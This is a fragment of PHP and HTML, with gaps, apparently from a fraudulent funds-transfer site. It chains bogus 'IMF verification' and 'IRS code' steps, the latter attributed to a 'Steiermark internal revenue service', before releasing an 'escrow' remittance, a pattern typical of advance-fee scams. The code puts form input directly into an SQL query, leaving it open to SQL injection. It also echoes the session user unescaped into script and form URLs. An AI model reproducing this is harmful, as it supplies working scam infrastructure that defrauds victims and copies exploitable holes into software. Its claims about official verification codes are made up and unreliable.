...
if(isset($_POST['pro'])){
	...
	$admin_query = "select * from cot where item='$item' AND id=3";
	...
	echo "<script>alert('Your IMF verification is successfull. Press OK to continue')</script>";
	echo "<script>window.open('proceed5.php?user=".$_SESSION['user']."','_self')</script>";
	}
	else {
	
	echo "<script>alert('Code Invalid. Try Again!')</script>";
	echo "<script>window.open('proceed4.php?user=".$_SESSION['user']."','_self')</script>";
...
<div id="div1">
	<p></p>
    <form method="post" action="proceed6.php?user=<?php echo $_SESSION['user']; ?>">
    <label>Please enter your IRS code to proceed with your funds transfer<br/><strong>IRS</strong> code is Internal Revenue Service code is the validation code from the Steiermark internal revenue service, for your Escrow account remittance transfer.</label>
    <input type="text" name="item" placeholder="IRS" required>
